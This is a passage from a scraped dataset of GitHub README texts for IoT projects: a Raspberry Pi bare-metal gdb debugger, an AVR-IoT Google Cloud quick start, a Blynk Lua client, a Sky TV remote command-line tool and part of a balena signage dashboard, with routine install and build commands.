drivers\nthe raspberry pi has a nice set of i/o interfaces (spi, i2c, gpio, usb, etc.) which makes it a good candidate to write the low-level parts of your drivers.\nyou can easily write, debug and test your i/o peripheral driver just its hardware documentation and gdb. you can then integrate it in any os driver api such as linux, freertos, etc. note that is a very good practice to be able to easily test a driver.\nsimply plug your i/o peripheral and get started:\nyou can start exploring the hardware/software interface through gdb memory read and write commands.\nfocus on what really matters thanks a ready-to-use execution environment incluing supervisor-level execution privileges.\nhigh performance\nthe highest levels of performance and responsiveness can be easily reached bare metal. being alone on the machine, right above the hardware/software interface, allows to avoid time-consuming calls and to reach the fastest response times and throughputs.\nlearning by doing\nlearning embedded software usually comes at a price you can now avoid with this gdb-centric approach. no extra jtag probe, no complex firmware & bootloader dependency and no complex tools. here, it's a simple matter of powering on the raspberry pi and launching gdb to load a program and run/debug/test it using the same tools (gcc) and file formats (elf) as usual native programming. gdb is the most famous debugging -----> tool !!!  which is much more than a simple debugger.\nmoreover, alpha can catch common programming errors such as memory access violations to stop the execution exactly where the mistake happened:\n(gdb) monitor gdb/catch\nrst : no : reset exception\nund : no : undefined instruction exception\nswi : no : software interrupt exception\npabrt : no : prefetch abort exception\ndabrt : no : data abort exception\nirq : no : irq (interrupt) exception\nfiqr : no : fiq (fast interrupt) exception\n(gdb) monitor gdb/catch dabrt yes\ndabrt : yes : data abort exception\nso have fun and enjoy exploring the gpu, enabling another core, communicating through usb, or whatever comes to your mind.\noperating system debugging\nos-aware debugging is part of our business-level plan and is disabled in this version. please, contact us for more details.\nmulti-core debugging\nmulti-core debugging is part of our business-level plan and is disabled in this version. please, contact us for more details.\na convenient programming environment\na bare metal c library\nrunning bare metal does not mean at all having to write everything from scratch and in assembly. this repository shows program examples written in c and involving calls to the c library, such as printf() and scanf().\nthe provided c library is the newlib (because it can be directly integrated into gcc), which relies on the posix syscalls. some of them\nthe most useful ones when prototyping, benchmarking & testing - can be handled by gdb (see below), while others are implemented bare metal and others not at all.\nlist of delegated syscalls\nsyscalls are delegated to gdb by alpha through its remote protocol. their number and their arguments are limited but it is enough to print convenience logs, write benchmark results into csv files, etc.\nopen\nclose\nread\nwrite\nlseek\nrename\nunlink\nstat/fstat\ngettimeofday\nisatty\nsystem\nlist of implemented syscalls\nsyscalls that are implemented and can be used bare metal:\nbrk: requires a global symbol _end as beginning of the free area. we provide it through our linker script sdk/link.ld as the end of the program.\na stack\nthe stack address is configured in the linker script through the __stack symbol. its maximum size is thus the configured address minus the next non-free memory region.\nan address space\nalpha maps a useful address space including the ram and the memory-mapped i/os:\nan extended gdb server\nexiting gdb resets the soc\nresetting the hardware is a good practice to avoid side-effects and make things repeatable. correctly leaving gdb sends a kill command to the target, which is translated by alpha into a soc reset, so you don't have to bother turning it off and on again to restart from scratch.\nstopping the execution\nasynchronously interrupt the raspberry pi while it is executing your program using the command interrupt or the sigint signal through the ctrlc keystroke.\nfor example:\n(gdb) continue\ncontinuing.\n^c\nprogram received signal sigstop, stopped (signal).\n0x0000921c in __ieee754_sqrt ()\n(gdb) # the execution is stopped\n(gdb) continue &\ncontinuing.\n(gdb) interrupt\nprogram received signal sigstop, stopped (signal).\n0x0000921c in __ieee754_sqrt ()\n(gdb) # the execution is stopped\nthis feature requires external interrupts which must be unmasked (enabled) to allow them. here is an example using gdb's built-in scripting:\n(gdb) print /x $cpsr &= ~(1 << 7)\n$1 = 0x6000015f\nthe raytracer example below uses it to be able to interrupt endless loop and quit gdb.\nalpha-specific commands\nalpha provides extra gdb commands accessible through the monitor command:\n(gdb) monitor help\nhelp [command]\nprint help of all or help of command in parameter\nversion\nprint version of alpha target\nmr8 address [count]\nread count or 1 8bit word at address\nmr16 address [count]\nread count or 1 16bit word at address\nmr32 address [count]\nread count or 1 32bit word at address\nmw8 address value\nwrite the 8bit word value at address\nmw16 address value\nwrite the 16bit word value at address\nmw32 address value\nwrite the 32bit word value at address\nfill32 address count value\nfill at address count 32bit word with value\ngdb/wcet [yes|no]\nprint or set alpha wcet mode\ngdb/catch\nprint the list of exceptions that can be caught by alpha\ngdb/catch exception [yes|no]\nprint or set/unset the catching of exception\ninstallation\nalpha\ninstalling alpha into your raspberry pi is very easy. you simply need to copy boot/{alpha.bin, config.txt} into the boot partition of your raspberry pi' sd card. alpha is then started by the raspberry pi's bootloader from its sd card according to config.txt directives (load & start address).\nthe script scripts/install-rpi-boot.sh creates a new sd card from scratch by:\ndownloading the officially distributed firmware and bootloader into boot/.\nformatting the sd card in fat32 (without partitioning it).\ncopying every files in boot/ into the sd card.\n$ ./scripts/install-rpi-boot.sh /dev/<your sd card>\n[+] downloading the raspberry pi's firmware version 1.20161215\n######################################################################## 100.0%\n######################################################################## 100.0%\n[+] temporarily mounting `/dev/<your sd card>` into `/tmp/rpi-sdcard-mountpoint`\n[+] installing the rpi firmware and the alpha debugger\n'boot/bootcode.bin' -> '/tmp/rpi-sdcard-mountpoint/bootcode.bin'\n'boot/start.elf' -> '/tmp/rpi-sdcard-mountpoint/start.elf'\n'boot/alpha.bin' -> '/tmp/rpi-sdcard-mountpoint/alpha.bin'\n'boot/config.txt' -> '/tmp/rpi-sdcard-mountpoint/config.txt'\n[+] checking the integrity\n/tmp/rpi-sdcard-mountpoint/bootcode.bin: ok\n/tmp/rpi-sdcard-mountpoint/start.elf: ok\n/tmp/rpi-sdcard-mountpoint/alpha.bin: ok\n[+] un-mounting `/tmp/rpi-sdcard-mountpoint`\n[+] your sd card is ready!\n[+] you can now insert it into the rpi and use alpha through the rpi's mini-uart\nwiring\nusing gdb in client/server mode requires a link between your workstation and your raspberry pi. for portability reasons, we chose the raspberry pi's mini-uart. you can connect it to your workstation using a usb-uart ttl 3.3v (not 5v) converter.\nhere are some random converter references:\nadafruit's ttl cable\nftdi's ttl cable ttl-232r-3v3.\nor do it yourself using a usb-uart ttl 3.3v converter, 3 jumper cables and 1 usb cable.\nexamples\ntwo bare metal programs are provided as examples: a hello world including bare metal calls to printf() and scanf(), and a raytracer using the gpu.\nnote that we use docker to produce our development environments and build a debian image with the expected tools, including the gcc toolchain for the arm architecture. the makefile command make shell builds the docker image according to sdk/dockerfile. it is up to you to use it or use instead your own setup (and you can find the list of required dependencies in the sdk/dockerfile).\n$ make shell\ndocker build -f sdk/dockerfile --build-arg uid=$(id -u) .\nsending build context to docker daemon 3.843 mb\nstep 1 : from debian:stretch\n...\nsuccessfully built 730a81db9233\nuser@3979cd200f4b:/home/user/farjump/raspberry-pi$ # let's get started\ngdb is then used to remotely load the program. the file run.gdb is a helper gdb script:\nconnecting to the target through the tty interface of the ttl cable.\nloading the elf executable.\nstarting running the program until entering the main() function.\nyou need to replace the serial interface /dev/ttyusb0 with yours (usually /dev/ttyusb*, /dev/ttyacm*, /dev/cu.* ... according to your os).\n$ arm-none-eabi-gdb -x run.gdb <your elf program>\nhello world\ncompiling\n$ make hello.elf\narm-none-eabi-gcc -specs=sdk/alpha.specs -mfloat-abi=hard -mfpu=vfp -march=armv6zk -mtune=arm1176jzf-s -g3 -ggdb -wl,-tsdk/link.ld -lsdk -wl,-umalloc -wl,-map,hello.map -o hello.elf src/hello-world/helloworld.c\nrunning\nuser@f76db25a61c1:/home/user/farjump/raspberry-pi$ arm-none-eabi-gdb -x run.gdb hello.elf\nreading symbols from hello.elf...done.\n0x07f10570 in ?? ()\nloading section .entry, size 0x14f lma 0x8000\nloading section .text, size 0x11ed4 lma 0x8150\nloading section .init, size 0x18 lma 0x1a024\nloading section .fini, size 0x18 lma 0x1a03c\nloading section .rodata, size 0x50c lma 0x1a058\nloading section .arm.exidx, size 0x8 lma 0x1a564\nloading section .eh_frame, size 0x4 lma 0x1a56c\nloading section .init_array, size 0x8 lma 0x2a570\nloading section .fini_array, size 0x4 lma 0x2a578\nloading section .jcr, size 0x4 lma 0x2a57c\nloading section .data, size 0x9ac lma 0x2a580\nstart address 0x820c, load size 77607\ntransfer rate: 10 kb/sec, 892 bytes/write.\ntemporary breakpoint 1 at 0x832c: file src/hello-world/helloworld.c, line 7.\ntemporary breakpoint 1, main () at src/hello-world/helloworld.c:7\n7 printf(\"enter a string: \\e[?25h\");\n(gdb) # we have reached the main() function, have fun now ;)\n(gdb) continue\ncontinuing.\nenter a string: farjumper\nrpi says \"hello farjumper!\"\nprogram received signal sigtrap, trace/breakpoint trap.\n_exit (rc=0) at sysfileio/makefile/../source/sysfileio_exit.c:11\n11 sysfileio/makefile/../source/sysfileio_exit.c: no such file or directory.\n(gdb) quit\nuser@f76db25a61c1:/home/user/farjump/raspberry-pi$ # the rpi resets.\nraytracer\ncompiling\n$ make raytracer.elf\narm-none-eabi-gcc -specs=sdk/alpha.specs -mfloat-abi=hard -mfpu=vfp -march=armv6zk -mtune=arm1176jzf-s -g3 -ggdb -wl,-tsdk/link.ld -lsdk -wl,-umalloc -wl,-map,raytracer.map -o raytracer.elf -og src/raytracer/main.c src/raytracer/raytracing.c src/raytracer/vc.c src/raytracer/vc_aligned_buffer.s -lm\nrunning\nif you want to watch the video output, plug first a screen to your rpi's hdmi port ;)\nuser@f76db25a61c1:/home/user/farjump/raspberry-pi$ arm-none-eabi-gdb -x run.gdb raytracer.elf\nreading symbols from raytracer.elf...done.\n0x07f10570 in ?? ()\nloading section .entry, size 0x14f lma 0x8000\nloading section .text, size 0x1890 lma 0x8150\nloading section .init, size 0x18 lma 0x99e0\nloading section .fini, size 0x18 lma 0x99f8\nloading section .rodata, size 0xc lma 0x9a10\nloading section .arm.exidx, size 0x8 lma 0x9a1c\nloading section .eh_frame, size 0x4 lma 0x9a24\nloading section .init_array, size 0x8 lma 0x19a28\nloading section .fini_array, size 0x4 lma 0x19a30\nloading section .jcr, size 0x4 lma 0x19a34\nloading section .data, size 0x590 lma 0x19a38\nstart address 0x820c, load size 8135\ntransfer rate: 10 kb/sec, 451 bytes/write.\ntemporary breakpoint 1 at 0x8320: file src/raytracer/main.c, line 221.\ntemporary breakpoint 1, main () at src/raytracer/main.c:221\n221 {\n(gdb) # enable external interrupts to be able to stop the execution later\n(gdb) print /x $cpsr &= ~(1 << 7)\n$1 = 0x6000015f\n(gdb) continue\ncontinuing.\n^c\nprogram received signal sigstop, stopped (signal).\n0x0000921c in __ieee754_sqrt ()\n(gdb) quit\nuser@f76db25a61c1:/home/user/farjump/raspberry-pi$ # the rpi resets.\nsupport\nsupport is provided through this repository's issue board. feel free to also contact us.\nlicensing\nsee license for the full license text.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000963, "year": null}, {"Unnamed: 0": 971, "autor": 971, "date": null, "content": "AVR-IoT Quick Start\nA rapid deployment tool for getting your AVR-IoT data on the cloud. Powered by Leverege.\nTalk to an Expert \u00bb\nWant to see how easy IoT can be? Check out our blog post with video walkthroughs of the Quick Start!\n(Links will open in this window. Shift+click, command+click, or middle mouse click to open in new window or tab.)\nTable of Contents\nSet up your GCP and Firebase Projects\nRun the Quickstart Script\nAdd your devices public key to your IoT Core Registry\nUpdate your AVR-IoT device firmware\nThis repository contains resources for quickly connecting your AVR-IoT device to your own Google Project and deploying a live UI to Firebase.\nFollowing this guide, you will clone this repo into your Google Cloud project, and run a script that:\nenables Cloud Functions, Cloud IoT Core, and Pub/Sub,\ncreates an avr-iot Pub/Sub topic,\ncreates an IoT registry (default name: AVR-IOT, configurable in the script),\nadds your device's UID to the registry,\nbuilds and deploys a Cloud Function to route Pub/Sub messages to your Firebase project, and\nbuilds and deploys a UI to firebase.\nAfter running the quick script, you'll need to add your device's secure pubkey to the device's entry in your IoT core registry and update the firmware on your device using Atmel START and Atmel Studio.\nSet up your GCP and Firebase Projects\nThe quickstart requires that you have a Firebase project connected to a GCP project with billing enabled.\nGCP Project\nCreate (or select an existing) GCP project.\nGO TO THE MANAGE RESOURCES PAGE\nEnable billing for the project.\nLEARN HOW TO ENABLE BILLING\nFirebase Project\nLaunch the Firebase Console.\nGO TO FIREBASE CONSOLE\nSelect 'Add project'.\nIn the Project Name field, select the GCP project you created or selected above.\nClick 'Add Firebase'.\nRun the Quickstart Script\nOpen Cloud Shell from your project.\nIn the shell, run\ngit clone https://github.com/Leverege/microchip-avr-iot.git && cd microchip-avr-iot/setup && bash setup.sh\nto clone this repo, enter the newly created directory, and run the quickstart script.\nYou will need to provide firebase authentication. To do this, copy the authentication URL provided in the shell console, and paste it into a new browser window. Then, log in on that page, authorize the app, and copy the security key. Paste the security key into the shell at the prompt and hit return.\nAt the prompt, enter your AVR-IoT device's UID. Your device's UID is the last portion of the url you see after launching CLICK-ME.HTM from the device.\nIf you would like to customize your IOT Core registry name, you may do so at the IoT core registry name prompt.\nIoT core registry names must start with a letter, use only letters, numbers, hyphens, and the following characters:\n+ . % _ ~\nThe setup script will run for several minutes. The setup script will:\nEnable Cloud Functions, IoT Core, and Pub Sub in your GCP project\nCreate an IoT Core registry called AVR-IOT and register your device\nInstall, build, and deploy Cloud Functions and the UI\nAdd your device public key to your IoT Core Registry\nMake sure your device is connected to your computer via USB.\nOpen your IoT Core registry management page, and select the AVR-IOT registry.\nOPEN IOT CORE REGISTRY MANAGEMENT\nClick on your device's UID in the list.\nBecause registry entries must begin with a letter your device UID will be prefixed with a 'd'. To search for your device by uid, you must enter 'd<your_device_id>' in the search box.\nClick the Add public key button.\nSelect 'Upload' under the input method, and ES256 (not ES256_X509) as the public key format. Then click the Browse button.\nIn the upload window, navigate to the CURIOSITY drive, then select PUBKEY.TXT and click add to upload it.\nUpdate your AVR-IoT device firmware\nNavigate to the Atmel START Rapid Development Tool. Please note that this software is Windows only.\nClick the Browse Example button.\nSearch for ATMEGA4808 and select AVR IoT WG Sensor Node.\nClick on Open Example.\nScroll down to the Cloud Configuration section, and enter your GCP Project ID and Registry ID.\nSelect the \"WIFI_0\" module under \"My Software Components\" to display the WiFi configuration settings.\nUnder the WLAN Configuration section, enter in your WiFi credentials. Note: the network must be 2.4Ghz as the device cannot connect to 5.0 Ghz networks.\nSwitch to the Export Project tab and click on Download Pack.\nOpen the .atzip file in Atmel Studio and select Build Solution under the Build menu bar (or hit F7). Atmel Studio will generate a .hex file in the folder where you saved your project.\nBy default, it will be located in ..\\Atmel_Studio\\7.0\\<YourProjectName>\\<YourProjectName>\\Debug\nDrag and drop the .hex project file into your CURIOSITY drive.\nView your live data!\nAnd that's it! If you've edited your device with the Atmel START rapid development tool, you should see live data flowing to your new Firebase app at <your-project-id>.firebaseapp.com/device/<your-device-uid>.\nBuilding a solution at scale?\nWant to build something bigger? We can help you scale your projects into solutions. Talk to an IoT expert.\nWhether you're a Fortune 500 company or startup, transforming your current business or creating entirely new businesses, it takes a team with deep experience across verticals and use cases to turn your IoT prototype into an IoT product.", "link": "https://github.com/Leverege/microchip-avr-iot", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "avr-iot quick start\na rapid deployment -----> tool !!!  for getting your avr-iot data on the cloud. powered by leverege.\ntalk to an expert \u00bb\nwant to see how easy iot can be? check out our blog post with video walkthroughs of the quick start!\n(links will open in this window. shift+click, command+click, or middle mouse click to open in new window or tab.)\ntable of contents\nset up your gcp and firebase projects\nrun the quickstart script\nadd your devices public key to your iot core registry\nupdate your avr-iot device firmware\nthis repository contains resources for quickly connecting your avr-iot device to your own google project and deploying a live ui to firebase.\nfollowing this guide, you will clone this repo into your google cloud project, and run a script that:\nenables cloud functions, cloud iot core, and pub/sub,\ncreates an avr-iot pub/sub topic,\ncreates an iot registry (default name: avr-iot, configurable in the script),\nadds your device's uid to the registry,\nbuilds and deploys a cloud function to route pub/sub messages to your firebase project, and\nbuilds and deploys a ui to firebase.\nafter running the quick script, you'll need to add your device's secure pubkey to the device's entry in your iot core registry and update the firmware on your device using atmel start and atmel studio.\nset up your gcp and firebase projects\nthe quickstart requires that you have a firebase project connected to a gcp project with billing enabled.\ngcp project\ncreate (or select an existing) gcp project.\ngo to the manage resources page\nenable billing for the project.\nlearn how to enable billing\nfirebase project\nlaunch the firebase console.\ngo to firebase console\nselect 'add project'.\nin the project name field, select the gcp project you created or selected above.\nclick 'add firebase'.\nrun the quickstart script\nopen cloud shell from your project.\nin the shell, run\ngit clone https://github.com/leverege/microchip-avr-iot.git && cd microchip-avr-iot/setup && bash setup.sh\nto clone this repo, enter the newly created directory, and run the quickstart script.\nyou will need to provide firebase authentication. to do this, copy the authentication url provided in the shell console, and paste it into a new browser window. then, log in on that page, authorize the app, and copy the security key. paste the security key into the shell at the prompt and hit return.\nat the prompt, enter your avr-iot device's uid. your device's uid is the last portion of the url you see after launching click-me.htm from the device.\nif you would like to customize your iot core registry name, you may do so at the iot core registry name prompt.\niot core registry names must start with a letter, use only letters, numbers, hyphens, and the following characters:\n+ . % _ ~\nthe setup script will run for several minutes. the setup script will:\nenable cloud functions, iot core, and pub sub in your gcp project\ncreate an iot core registry called avr-iot and register your device\ninstall, build, and deploy cloud functions and the ui\nadd your device public key to your iot core registry\nmake sure your device is connected to your computer via usb.\nopen your iot core registry management page, and select the avr-iot registry.\nopen iot core registry management\nclick on your device's uid in the list.\nbecause registry entries must begin with a letter your device uid will be prefixed with a 'd'. to search for your device by uid, you must enter 'd<your_device_id>' in the search box.\nclick the add public key button.\nselect 'upload' under the input method, and es256 (not es256_x509) as the public key format. then click the browse button.\nin the upload window, navigate to the curiosity drive, then select pubkey.txt and click add to upload it.\nupdate your avr-iot device firmware\nnavigate to the atmel start rapid development tool. please note that this software is windows only.\nclick the browse example button.\nsearch for atmega4808 and select avr iot wg sensor node.\nclick on open example.\nscroll down to the cloud configuration section, and enter your gcp project id and registry id.\nselect the \"wifi_0\" module under \"my software components\" to display the wifi configuration settings.\nunder the wlan configuration section, enter in your wifi credentials. note: the network must be 2.4ghz as the device cannot connect to 5.0 ghz networks.\nswitch to the export project tab and click on download pack.\nopen the .atzip file in atmel studio and select build solution under the build menu bar (or hit f7). atmel studio will generate a .hex file in the folder where you saved your project.\nby default, it will be located in ..\\atmel_studio\\7.0\\<yourprojectname>\\<yourprojectname>\\debug\ndrag and drop the .hex project file into your curiosity drive.\nview your live data!\nand that's it! if you've edited your device with the atmel start rapid development tool, you should see live data flowing to your new firebase app at <your-project-id>.firebaseapp.com/device/<your-device-uid>.\nbuilding a solution at scale?\nwant to build something bigger? we can help you scale your projects into solutions. talk to an iot expert.\nwhether you're a fortune 500 company or startup, transforming your current business or creating entirely new businesses, it takes a team with deep experience across verticals and use cases to turn your iot prototype into an iot product.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000971, "year": null}, {"Unnamed: 0": 987, "autor": 987, "date": null, "content": "Lua client for Blynk IoT\nNote: The library has been updated for Blynk 2.0\nIf you like Blynk - give it a star, or fork it and contribute!\nWhat is Blynk?\nBlynk provides iOS and Android apps to control any hardware over the Internet or directly using Bluetooth. You can easily build graphic interfaces for all your projects by simply dragging and dropping widgets, right on your smartphone. Blynk is the most popular IoT platform used by design studios, makers, educators, and equipment vendors all over the world.\nDownload\nBlynk Mobile App: Google Play | App Store\nDocumentation\nSocial: Webpage / Facebook / Twitter / Kickstarter\nDocumentation: https://docs.blynk.io\nCommunity Forum: http://community.blynk.cc\nBlynk for Business: http://www.blynk.io\nUsage example\nlocal Blynk = require(\"blynk.socket\")\nlocal blynk = Blynk.new(\"your_auth_token\")\n-- callback to run when V1 changes\nblynk:on(\"V1\", function(param)\nprint(\"V1:\", tonumber(param[1]), tonumber(param[2]))\nend)\n-- callback to run when cloud requests V2 value\nblynk:on(\"readV2\", function(param)\nblynk:virtualWrite(2, os.time())\nend)\nlocal sock = getSocketConnection() -- omitted\nblynk:connect(sock)\nwhile true do\nblynk:run()\nend\nYou can run the full example:\nlua ./examples/client.lua <your_auth_token>\nFeatures\nLua 5.1, Lua 5.2, Lua 5.3, LuaJIT support\nLinux, Windows, MacOS support\nvirtualWrite\nsyncVirtual\nsetProperty\nlogEvent\nevents: Vn, readVn, connected, disconnected, redirect\nTCP and secure TLS/SSL connection support\ncan run on embedded hardware, like NodeMCU or OpenWrt\nOpenWrt installation\nopkg update\nopkg install lua luasocket luasec\n# openssl is needed for wget to handle https://\nopkg install wget openssl-util libustream-openssl\n# Get blynk-library-lua from github\ncd /root\nwget --no-check-certificate -qO- https://github.com/vshymanskyy/blynk-library-lua/archive/v0.1.4.tar.gz | tar xvz\ncd blynk-library-lua-0.1.4\n# Run it\nlua ./examples/client.lua <your_auth_token>\nNodeMCU installation\nIt is very easy to get it running on NodeMCU (or any other ESP8266/ESP32-based device):\nGet the latest nodemcu-firmware running on your device.\nYou can use their online build service.\nIt is recommended to include encoder, TLS/SSL modules.\nEdit nodemcu.lua example (put your auth token and wifi credentials)\nUse nodemcu-tool or any other method to transfer lua files to the device.\nNote: the NodeMCU filesystem is \"flat\" (folders not supported), but it handles the / symbol nicely.\nBe sure to preserve the relative path when copying files:\nnodemcu-tool upload -mck ./blynk.lua ./blynk/pipe.lua ./blynk/nodemcu.lua\nnodemcu-tool upload ./examples/nodemcu.lua -n init.lua\nOpen device terminal and run dofile(\"init.lua\")\nblynk object is global, so you can call it from the interactive console:\nblynk:virtualWrite(1, tmr.time())\nUbuntu/Linux/Raspberry Pi installation\nsudo apt-get install lua5.3 lua-sec lua-socket\nBonus\nThe Timer is included for demonstration purposes.\nHere are also some handy functions:\nlocal function millis()\nreturn math.floor(socket.gettime()*1000)\nend\nlocal function delay(msec)\nreturn socket.sleep(msec/1000)\nend\nImplementations for other platforms\nArduino\nParticle\nNode.js, Espruino, Browsers\nPython, MicroPython\nOpenWrt packages\nMBED\nNode-RED for Blynk IoT\nLabVIEW\nC#\nLicense\nThis project is released under The MIT License (MIT)", "link": "https://github.com/vshymanskyy/blynk-library-lua", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "lua client for blynk iot\nnote: the library has been updated for blynk 2.0\nif you like blynk - give it a star, or fork it and contribute!\nwhat is blynk?\nblynk provides ios and android apps to control any hardware over the internet or directly using bluetooth. you can easily build graphic interfaces for all your projects by simply dragging and dropping widgets, right on your smartphone. blynk is the most popular iot platform used by design studios, makers, educators, and equipment vendors all over the world.\ndownload\nblynk mobile app: google play | app store\ndocumentation\nsocial: webpage / facebook / twitter / kickstarter\ndocumentation: https://docs.blynk.io\ncommunity forum: http://community.blynk.cc\nblynk for business: http://www.blynk.io\nusage example\nlocal blynk = require(\"blynk.socket\")\nlocal blynk = blynk.new(\"your_auth_token\")\n-- callback to run when v1 changes\nblynk:on(\"v1\", function(param)\nprint(\"v1:\", tonumber(param[1]), tonumber(param[2]))\nend)\n-- callback to run when cloud requests v2 value\nblynk:on(\"readv2\", function(param)\nblynk:virtualwrite(2, os.time())\nend)\nlocal sock = getsocketconnection() -- omitted\nblynk:connect(sock)\nwhile true do\nblynk:run()\nend\nyou can run the full example:\nlua ./examples/client.lua <your_auth_token>\nfeatures\nlua 5.1, lua 5.2, lua 5.3, luajit support\nlinux, windows, macos support\nvirtualwrite\nsyncvirtual\nsetproperty\nlogevent\nevents: vn, readvn, connected, disconnected, redirect\ntcp and secure tls/ssl connection support\ncan run on embedded hardware, like nodemcu or openwrt\nopenwrt installation\nopkg update\nopkg install lua luasocket luasec\n# openssl is needed for wget to handle https://\nopkg install wget openssl-util libustream-openssl\n# get blynk-library-lua from github\ncd /root\nwget --no-check-certificate -qo- https://github.com/vshymanskyy/blynk-library-lua/archive/v0.1.4.tar.gz | tar xvz\ncd blynk-library-lua-0.1.4\n# run it\nlua ./examples/client.lua <your_auth_token>\nnodemcu installation\nit is very easy to get it running on nodemcu (or any other esp8266/esp32-based device):\nget the latest nodemcu-firmware running on your device.\nyou can use their online build service.\nit is recommended to include encoder, tls/ssl modules.\nedit nodemcu.lua example (put your auth token and wifi credentials)\nuse nodemcu------> tool !!!  or any other method to transfer lua files to the device.\nnote: the nodemcu filesystem is \"flat\" (folders not supported), but it handles the / symbol nicely.\nbe sure to preserve the relative path when copying files:\nnodemcu-tool upload -mck ./blynk.lua ./blynk/pipe.lua ./blynk/nodemcu.lua\nnodemcu-tool upload ./examples/nodemcu.lua -n init.lua\nopen device terminal and run dofile(\"init.lua\")\nblynk object is global, so you can call it from the interactive console:\nblynk:virtualwrite(1, tmr.time())\nubuntu/linux/raspberry pi installation\nsudo apt-get install lua5.3 lua-sec lua-socket\nbonus\nthe timer is included for demonstration purposes.\nhere are also some handy functions:\nlocal function millis()\nreturn math.floor(socket.gettime()*1000)\nend\nlocal function delay(msec)\nreturn socket.sleep(msec/1000)\nend\nimplementations for other platforms\narduino\nparticle\nnode.js, espruino, browsers\npython, micropython\nopenwrt packages\nmbed\nnode-red for blynk iot\nlabview\nc#\nlicense\nthis project is released under the mit license (mit)", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000987, "year": null}, {"Unnamed: 0": 989, "autor": 989, "date": null, "content": "sky-remote-cli\nA command line app to send remote control commands to a Sky TV box. Compatible with Sky+HD and Sky Q.\nUsage\nInstallation\nYou'll need to install this globally with the -g flag.\nnpm install -g sky-remote-cli\nControlling a Sky TV box\nThe first argument must be the IP address of the Sky box you want to control. All arguments after that are commands to send to the box - you can send just one command or many at once (they will be sent in sequence). If connecting to a Sky Q box running formware older than v0.60, pass the --sky_q_legacy flag. The previously used --sky_q flag now has no impact (but is still accepted for compatability).\nTurn the box on / off\nsky-remote-cli 192.168.0.40 power\nor, for Sky Q (with older firmware <0.60):\nsky-remote-cli --sky_q_legacy 192.168.0.40 power\nChannel up, pause, show info\nsky-remote-cli 192.168.0.40 channelup pause i\nChange channel to 101\nsky-remote-cli 192.168.0.40 1 0 1\nRemote control commands\nsky power\ntvguide or home boxoffice services or search interactive or sidebar\nup down left right select\nchannelup channeldown i\nbackup or dismiss text help\nplay pause rewind fastforward stop record\nred green yellow blue\n0 1 2 3 4 5 6 7 8 9\nSee also\nhttp://github.com/dalhundal/sky-remote - The underlying Node module used by this tool\nhttp://github.com/dalhundal/sky-q - A Node module for interacting with Sky Q boxes", "link": "https://github.com/dalhundal/sky-remote-cli", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "sky-remote-cli\na command line app to send remote control commands to a sky tv box. compatible with sky+hd and sky q.\nusage\ninstallation\nyou'll need to install this globally with the -g flag.\nnpm install -g sky-remote-cli\ncontrolling a sky tv box\nthe first argument must be the ip address of the sky box you want to control. all arguments after that are commands to send to the box - you can send just one command or many at once (they will be sent in sequence). if connecting to a sky q box running formware older than v0.60, pass the --sky_q_legacy flag. the previously used --sky_q flag now has no impact (but is still accepted for compatability).\nturn the box on / off\nsky-remote-cli 192.168.0.40 power\nor, for sky q (with older firmware <0.60):\nsky-remote-cli --sky_q_legacy 192.168.0.40 power\nchannel up, pause, show info\nsky-remote-cli 192.168.0.40 channelup pause i\nchange channel to 101\nsky-remote-cli 192.168.0.40 1 0 1\nremote control commands\nsky power\ntvguide or home boxoffice services or search interactive or sidebar\nup down left right select\nchannelup channeldown i\nbackup or dismiss text help\nplay pause rewind fastforward stop record\nred green yellow blue\n0 1 2 3 4 5 6 7 8 9\nsee also\nhttp://github.com/dalhundal/sky-remote - the underlying node module used by this -----> tool !!! \nhttp://github.com/dalhundal/sky-q - a node module for interacting with sky q boxes", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000989, "year": null}, {"Unnamed: 0": 992, "autor": 992, "date": null, "content": "balena-dashboards\nPlease consider donating to this project!\nThis project is a simple solution for managing multiple digital signage displays, dashboards, and other dynamic statistical data on raspberry-pi (or x86-x64 arch) powered displays, via one central admin panel. This project is intended for use in conjunction with balena.io (see below for link and account setup instructions).\nYou may be asking,\"What makes this dashboard project better than others?\"\nManaged through balena.io\nMultiple URLs/webpages to load\nCustom timeout values for each URL\nSupport for remote screen control/support/viewing\nFast load/runtime due to multi-threaded creation of browser windows\nGetting Started\nThese instructions will get you a copy of the project up and running on your local machine for development and testing purposes. See deployment for notes on how to deploy the project on a live system.\nPrerequisites\nThings you need to deploy this code to your device:\nSign up for a free account with balenaCloud here\nCreate an application\nAdd your device and download the OS. Make sure to specify the wifi information needed to connect your device\nFlash your SD card (balenaEtcher is recommended) and boot the device\nEnsure the device shows up in your application dashboard\nDownload the code for this project from GitHub, and push to your application, using the balena-cli tool\ngit clone https://github.com/willswire/dashboards.git\nbalena push *application-name*\nConfiguration\nThe following Enviroment Variables must be set within Application > Device under D(x) - Device Variables:\nName Value\nURL_ONE https://www.google.com [fully qualified URL to load]\nTIME_ONE 60 [integer which represents number of seconds to show URL]\nURL_TWO\nTIME_TWO\nURL_[...] infinte URLs to load\nTIME_[...] corresponding time values for each URL\nZOOM adjust zoom factor (must be in double format, i.e. 2.0). default is 1.0\nNOVNC_PASSWORD defaultpassword [obviously change this to something different]\nTZ America/New_York [obviously change this to your timezone, see Wikipedia for your TZ\nIn order to view the device remotely from within your browser, enable the public device URL within the device summary page. Then, you can simply click the link and login using the password set above.\nBuilt With\nElectronJS - The web framework used\nbalenaCloud - IoT device management\nnoVNC - Used to provide remote viewing/support through public device URL (enable in device settings)", "link": "https://github.com/willswire/balena-dashboards", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "balena-dashboards\nplease consider donating to this project!\nthis project is a simple solution for managing multiple digital signage displays, dashboards, and other dynamic statistical data on raspberry-pi (or x86-x64 arch) powered displays, via one central admin panel. this project is intended for use in conjunction with balena.io (see below for link and account setup instructions).\nyou may be asking,\"what makes this dashboard project better than others?\"\nmanaged through balena.io\nmultiple urls/webpages to load\ncustom timeout values for each url\nsupport for 